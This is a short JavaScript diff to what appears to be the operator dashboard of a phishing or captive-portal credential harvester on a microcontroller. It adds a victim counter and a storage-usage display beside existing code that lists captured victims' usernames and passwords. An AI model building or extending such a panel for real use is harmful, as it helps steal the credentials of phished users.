@@ -40,6 +40,8 @@ function getBizonhos(){
     .then(response => response.json())
     .then(data => {
         console.log(data);
+        document.getElementById("qnt-victims").innerText = data.victims.length;
+        
         for (let i = 0; i < data.victims.length; i++) {
             const bizonhos = data.victims[i];
             bizonhosAddHtml(bizonhos.username, bizonhos.password, bizonhos.useragent, bizonhos.datetime);
@@ -85,4 +87,25 @@ function deleteAllVictims(){
         })
         .catch(error => { console.error(error); })
     }
+}
+
+
+function getMemory(){
+    let total = document.getElementById("total");
+    let usado = document.getElementById("usado");
+    let livre = document.getElementById("livre");
+    let meter = document.getElementById("spiffs-usage");
+
+    fetch("/memory")
+    .then(response => response.json())
+    .then(data => {
+        console.log(data);
+        total.innerText = data.total;
+        usado.innerText = data.usado;
+        livre.innerText = data.livre;
+
+        meter.setAttribute('value', data.usado);
+        meter.setAttribute('max', data.total);
+    })
+    .catch(error => console.error("Impossivel obter dados da memoria!", error));
 }
